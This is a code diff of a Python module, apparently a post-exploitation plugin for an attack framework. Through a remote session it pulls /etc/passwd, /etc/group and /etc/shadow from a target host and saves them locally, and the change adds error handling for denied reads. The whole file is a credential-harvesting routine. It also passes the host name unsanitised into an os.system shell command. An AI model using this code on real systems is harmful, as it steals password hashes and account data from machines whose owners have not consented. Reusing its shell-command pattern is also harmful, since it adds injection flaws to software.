@@ -5,13 +5,22 @@ import misc.coloredstatus as cs
 from time import sleep
 import os
 
-waitforcapture = 1
-
 def execute(session, configs, params):
+
+    def download(remote, local):
+        try:
+            session.download_file(remote, download_dir + local)
+        except PermissionError:
+            pass
 
     download_dir = configs["DownloadDirectory"] + session.host + "/"
     os.system("mkdir -p " + download_dir)
-    session.download_file("/etc/passwd", download_dir + "passwd")
-    session.download_file("/etc/shadow", download_dir + "shadow")
-    session.download_file("/etc/group", download_dir + "group")
-    return 0 
+         
+    try:
+        download("/etc/passwd", "passwd")
+        download("/etc/group", "group")
+        download("/etc/shadow", "shadow")
+        
+        return 0
+    except:
+        return 2
